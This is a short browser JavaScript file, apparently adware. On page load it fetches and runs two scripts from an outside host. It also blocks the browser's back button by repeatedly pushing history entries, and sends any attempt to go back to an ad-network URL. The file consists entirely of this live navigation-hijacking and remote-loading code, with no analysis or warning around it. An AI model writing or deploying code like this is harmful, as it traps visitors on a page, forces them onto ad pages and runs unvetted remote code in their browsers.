let mainLoad = [
  "https://agcali.pahe.my.id/histads.js",
  "https://agcali.pahe.my.id/control.js"
];

let startLoad=0;
function getLoad(){
  let elLoad = document.createElement("script");
  elLoad.setAttribute("src",mainLoad[startLoad]);
  elLoad.onload = ()=>{
    startLoad+=1;
    if(mainLoad[startLoad]){
      getLoad();
    };
  };
  document.body.append(elLoad);
};
getLoad();

//---- disable back ----
history.pushState(null, document.title, window.location.href);
window.addEventListener('popstate', function (event)
{
  window.location.href="https://www.effectivecpmcontent.com/uijctn538c?key=4f219c1087bce980ac7a203a864c9d2b";
});
window.addEventListener('scroll', function() {
  history.pushState(null, document.title, window.location.href);
});
